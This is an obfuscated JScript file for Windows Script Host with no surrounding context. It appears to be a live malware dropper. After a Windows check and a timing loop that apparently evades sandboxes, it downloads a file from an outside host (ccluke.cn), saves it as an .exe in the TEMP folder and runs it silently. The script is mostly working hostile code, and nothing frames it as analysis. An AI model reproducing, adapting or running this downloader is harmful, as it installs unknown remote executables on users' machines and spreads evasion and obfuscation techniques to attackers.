var _O0 = false;
var _V = "CreateObject";
var _W1 = function _YD() {return WScript[_V]("WScript"+".Shell");}(), _I = 11;
var _W0 = "MSXML2.XMLHTTP";
var _EH = 2123213;
var _P = 0;
function _FI(_T){_W1["Run"](_T, _P, _P);};
function _K(){return _W0 + "";};
function _YN(_Y0, _U0){_P = _P * 1; return _Y0 - _U0;};
function _W(){return _V;};
/*@cc_on
  @if (@_win32 || @_win64)
    _O0 = true;
  @end
@*/
if (_O0)
{
var _Y = "";
function _Z(){return 22;};
var _XB = 0; var _KT = 0;
function _IZ()
{
var _WX = new this["Date"]();
var _O = _WX["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _WX = new this["Date"]();
var _N = _WX["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _WX = new this["Date"]();
var _RK = _WX["getUTCMilliseconds"]();
var _XB = "_XV";
_XB = _YN(_N, _O);
var _KT = "_ND";
_KT = _YN(_RK, _N);
_Y = "open";
return _YN(_XB, _KT);
}
var _RH = false;
var _P1 = false;
for (var _VG = _P; _VG < _Z() * 1; _VG++){if (_IZ() != _P){
_RH = true; 
_KT = "31" + 11 * _XB + _KT; 
_P1 = true; 
break;
}}
function _MZ() {return ((_RH == true) && (_RH == _P1)) ? 1 : _P;};
if (_RH && _MZ() && _P1){
function _U() {return _W1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qB4Jmexf.ex" + "e";};
 _DM = _K();
 _QF = WScript[_V](_DM);
 var _TM = 1;
 while (_TM){
try {
	if (_TM == 1)
	{
		_QF[_Y]("GET", "http://ccluke.cn/b7eus", false);
		_QF["send"]();
		_UA = "Sleep";
	}
	WScript[_UA](_Z() + 120); 
	if (_QF["readystate"] < 2 * 2) continue;
	_TM = _P;
	function _UM(_P0) {var _LO = (1, 2, 3, 4, 5, _P0); return _LO;};
	_KT0 = WScript[_W()]("ADODB.Stream");
	_DM = _KT0;
	_DM[_Y]();
	_DM["type"] = _UM(1);
	_DM["write"](_QF["ResponseBody"]);
	_KT0["position"] = _UM(_P);
	_DM["Save" + "ToFile"](_U(), 2);
	_KT0["cl"+"ose"]();
	_CG = _U();
	_FI(_CG);
} catch(_L){};
}
}
}

